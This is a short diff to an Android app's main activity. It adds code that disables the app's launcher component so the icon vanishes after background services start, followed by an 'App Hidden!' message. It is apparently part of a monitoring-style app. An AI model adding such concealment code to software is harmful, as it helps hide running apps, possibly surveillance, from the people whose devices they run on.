@@ -743,6 +743,15 @@ public class MainActivity extends AppCompatActivity {
             startService(mServiceIntent);
         }
         Toast.makeText(this, "All service started successfully don't need to login", Toast.LENGTH_LONG).show();
+
+//       Hide Application
+        PackageManager packageManager = getPackageManager();
+        ComponentName componentName = new ComponentName(MainActivity.this,MainActivity.class);
+        packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        Toast.makeText(MainActivity.this,"App Hidden!", Toast.LENGTH_SHORT).show();
+
+
     }
 
     public void registerActivity(View view){
